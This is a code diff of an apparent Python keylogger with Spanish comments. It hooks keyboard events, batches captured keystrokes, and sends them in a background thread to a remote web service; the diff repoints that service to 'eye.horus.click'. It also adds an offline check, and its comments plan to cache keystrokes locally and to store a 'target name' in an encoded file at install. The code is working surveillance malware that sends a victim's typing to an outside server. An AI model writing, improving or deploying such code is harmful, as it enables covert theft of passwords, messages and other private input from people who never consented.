@@ -11,9 +11,22 @@ from requests.exceptions import HTTPError
 
 i=0
 
+'''**Validación Offline**'''
+def internet_on():
+    try:
+        urllib2.urlopen('http://216.58.192.142', timeout=1)
+        return True
+    except urllib2.URLError as err: 
+        return False
+'''**Validación Offline**'''
+
 '''**CONFIGURACIÓN DEL REQUEST**'''
+'''Para name se propone que el instalador ejecute un textbox para almacenar el target name
+    en un archivo codificado que solo almacene ese nombre, y que al inicio de cada
+    ejecución, se verifique que ese archivo existe, se obtenga el dato o en su defecto
+    que se vuelva a solicitar el nombre y se genere nuevamente el archivo'''
 name="prueba2"
-base_url = "https://ed2ku4egij.execute-api.us-west-1.amazonaws.com/Prod/"
+base_url = "https://eye.horus.click/"
 
 def insertar():
     '''Se define la función asíncrona para insertar la información en el web service'''
@@ -104,10 +117,16 @@ def OnKeyboardEvent(event):
     elements.qpush(element)
 
     if elements.qlen() > 10:
-        '''Se manda a llamar a la función asíncrona
-        insertar()'''
-        insertar_thread = threading.Thread(target=insertar, name='Insercion Asincrona')
-        insertar_thread.start()
+        '''Se manda a llamar a la función asíncrona insertar()'''
+        if internet_on():
+            insertar_thread = threading.Thread(target=insertar, name='Insercion Asincrona')
+            insertar_thread.start()
+        else:
+            '''No hay internet, guardar la pila en un archivo y generar los métodos
+                para revisar al inicio de la ejecuión que el archivo esté vacío
+                y en su caso vaciarlo. La misma verifición cada que se vayan a
+                reailzar las inserciones (al revisar la pila por tiempo o por cantidad)'''
+            print('No hay Internet, próximamente solucionaremos el inconveniene')
     return True
 
 elements = Queue()
